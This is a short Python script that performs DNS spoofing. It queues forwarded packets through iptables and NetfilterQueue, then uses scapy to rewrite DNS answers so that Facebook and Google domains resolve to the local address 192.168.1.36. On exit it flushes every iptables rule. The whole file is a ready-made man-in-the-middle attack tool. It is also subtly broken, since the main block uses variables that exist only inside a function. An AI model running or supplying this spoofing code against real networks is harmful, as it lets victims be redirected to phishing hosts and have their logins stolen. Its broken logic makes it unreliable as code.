from netfilterqueue import NetfilterQueue
from scapy.all import * 
import os

dns_hosts = {
    "www.facebook.com." : "192.168.1.36",
    "google.com." : "192.168.1.36",
    "facebook.com." : "192.168.1.36"
}

def iptable_rule():
    QUEUE_NUM = 0
    os.system(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}")
    queue = NetfilterQueue()

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[After ]:", scapy_packet.summary())
        packet.set_payload(bytes(scapy_packet))
    packet.accept()


def modify_packet(packet):
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        print("no modification:", qname)
        return packet
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet

try:
    iptable_rule()
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("sudo iptables --flush")
